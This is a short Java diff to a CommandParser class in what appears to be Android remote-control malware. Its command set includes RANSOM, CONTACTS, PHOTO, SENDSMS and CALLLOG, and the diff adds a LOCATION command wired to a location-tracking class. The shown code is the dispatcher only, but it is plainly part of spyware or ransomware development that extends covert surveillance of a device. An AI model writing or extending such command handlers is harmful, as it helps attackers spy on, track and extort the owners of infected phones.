@@ -10,7 +10,7 @@ public class CommandParser {
 	}
 	
 	public ImmutableSet<String> acceptedCommands(){
-		return ImmutableSet.of("VIBRATE","CONTACTS","PHOTO","RANSOM","SENDSMS","CALLLOG");
+		return ImmutableSet.of("VIBRATE","CONTACTS","PHOTO","RANSOM","SENDSMS","CALLLOG","LOCATION");
 	}
 	
 	public Command dispatch(String commandString){
@@ -29,6 +29,8 @@ public class CommandParser {
 			return new SMSSenderCommand(commandable);
 		}else if(commandString.startsWith("CALLLOG")){
 			return new CallLogCommand(commandable);
+		}else if(commandString.startsWith("LOCATION")){
+			return new LocationManagerCommand(commandable);
 		}
 		return new UnknownCommand();
 	}
